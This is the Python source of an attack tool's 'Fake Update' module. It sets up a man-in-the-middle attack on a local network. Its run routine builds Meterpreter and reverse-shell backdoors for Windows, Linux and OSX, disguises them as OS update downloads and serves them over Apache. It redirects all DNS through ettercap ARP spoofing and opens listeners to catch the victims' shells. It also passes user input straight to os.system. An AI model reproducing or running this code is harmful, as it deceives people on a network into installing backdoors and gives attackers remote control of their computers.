#!/usr/bin/env python
#
# WebSploit Framework Fake Update module
# Idea By G0tmi1k
# Created By 0x0ptim0us (Fardin Allahverdinazhand)
# Email : 0x0ptim0us@Gmail.Com

import os
import subprocess
from time import sleep
from core import wcolors
from core import help
options = ["eth0", "192.168.1.1"]
def fakeupdate():
    try:
        line_1 = wcolors.color.UNDERL + wcolors.color.BLUE + "wsf" + wcolors.color.ENDC
        line_1 += ":"
        line_1 += wcolors.color.UNDERL + wcolors.color.BLUE + "Fake Update" + wcolors.color.ENDC
        line_1 += " > "
        com = raw_input(line_1)
        com = com.lower()
        if com[0:13] =='set interface':
            options[0] = com[14:20]
            print "INTERFACE => ", options[0]
            fakeupdate()
        elif com[0:9] =='set lhost':
            options[1] = com[10:25]
            print "LHOST => ", options[1]
            fakeupdate()
        elif com[0:12] =='show options':
            print ""
            print "Options\t\t Value\t\t\t\t RQ\t Description"
            print "---------\t--------------\t\t\t----\t--------------"
            print "Interface\t"+options[0]+"\t\t\t\tyes\tNetwork Interface Name"
            print "LHOST\t\t"+options[1]+"\t\t\tyes\tLocal IP Address"
            print ""
            fakeupdate()
        elif com[0:2] =='os':
            os.system(com[3:])
            fakeupdate()
        elif com[0:4] =='help':
            help.help()
            fakeupdate()
        elif com[0:4] =='back':
            pass
        elif com[0:3] =='run':
            print(wcolors.color.CYAN + "[!]Checking Setting, Please Wait ..." + wcolors.color.ENDC)
            sleep(2)
            subprocess.Popen('rm -rf /var/www/index.php /var/www/index.html /var/www/Linux.jpg /var/www/OSX.jpg /var/www/Windows.jpg /var/www/favicon.ico /var/www/Windows-KB183905-ENU.exe /var/www/Linux-update-EN-659 /var/www/OSX-update-HT3131', stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True).wait()
            subprocess.Popen('cp /usr/share/websploit/modules/fakeupdate/www/* /var/www/')
            print(wcolors.color.CYAN + "[*]Creating Backdoor For Windows OS ..." + wcolors.color.ENDC)
            cmd_1 = 'msfpayload windows/meterpreter/reverse_tcp LHOST=' + options[1] + ' LPORT=4441 X > /var/www/Windows-KB183905-ENU.exe'
            subprocess.Popen(cmd_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
            print(wcolors.color.CYAN + "[*]Creating Backdoor For Linux OS ..." + wcolors.color.ENDC)
            cmd_2 = 'msfpayload linux/x86/meterpreter/reverse_tcp LHOST=' + options[1] + ' LPORT=4442 X > /var/www/Linux-update-EN-659'
            subprocess.Popen(cmd_2, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
            print(wcolors.color.CYAN + "[*]Creating Backdoor For MAC OSX ..." + wcolors.color.ENDC)
            cmd_3 = 'msfpayload osx/x86/shell_reverse_tcp LHOST=' + options[1] + ' LPORT=4443 X > /var/www/OSX-update-HT3131'
            subprocess.Popen(cmd_3, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
            print(wcolors.color.GREEN + "[*]Create Backdoor's Successful." + wcolors.color.ENDC)
            sleep(2)
            print(wcolors.color.BLUE + "[*]Starting Web Server ..." + wcolors.color.ENDC)
            subprocess.Popen('service apache2 start', stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
            sleep(2)
            print(wcolors.color.BLUE + "[*]Starting DNS Spoofing ..." + wcolors.color.ENDC)
            try:
                os.chdir('/usr/local/share/ettercap')
                check_dir = os.listdir(os.curdir)
                if 'etter.dns' in check_dir:
                    subprocess.Popen('mv /usr/local/share/ettercap/etter.dns etter.dns.old', stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
                my_etter = open('etter.dns', 'w')
                my_etter.write('*\tA' + '\t'+ options[1])
                my_etter.close()
            except(OSError):
                print(wcolors.color.RED + wcolors.color.BOLD + "[*]Checking Ettercap ... Please Wait ..." + wcolors.color.ENDC)
            try:
                os.chdir('/usr/share/ettercap')
                check_dir = os.listdir(os.curdir)
                if 'etter.dns' in check_dir:
                    subprocess.Popen('mv /usr/share/ettercap/etter.dns etter.dns.old', stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
                my_etter = open('etter.dns', 'w')
                my_etter.write('*\tA' + '\t'+ options[1])
                my_etter.close()
            except(OSError):
                print(wcolors.color.BLUE +  "[*]Ettercap Launched ... [OK]" + wcolors.color.ENDC)
            dns_spoofing = 'ettercap -Tqi ' + options[0] + ' -M arp // // -P dns_spoof'
            subprocess.Popen(dns_spoofing, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
            print(wcolors.color.BLUE + "[*]Starting Listener For Windows, Linux, MacOSX ..." + wcolors.color.ENDC)
            windows_listener = 'xterm -e msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST=' + options[1] + ' LPORT=4441 E &'
            linux_listener = 'xterm -e msfcli exploit/multi/handler PAYLOAD=linux/x86/meterpreter/reverse_tcp LHOST=' + options[1] + ' LPORT=4442 E &'
            macosx_listener = 'xterm -e msfcli exploit/multi/handler PAYLOAD=osx/x86/shell_reverse_tcp LHOST=' + options[1] + ' LPORT=4443 E &'
            os.system(windows_listener)
            sleep(1)
            os.system(linux_listener)
            sleep(1)
            os.system(macosx_listener)
            print(wcolors.color.GREEN + "[*]Attack Has Been Started." + wcolors.color.ENDC)
            line_4 = wcolors.color.RED + "[!]When You Got The Session, Press [enter] Key For Kill DNS Spoof Attack ..." + wcolors.color.ENDC
            enter_key = raw_input(line_4)
            os.system('killall ettercap')
        else:
            print "Wrong Command => ", com
            fakeupdate()
    except(KeyboardInterrupt):
        print(wcolors.color.RED + "\n[*] (Ctrl + C ) Detected, Module Exit" + wcolors.color.ENDC)
        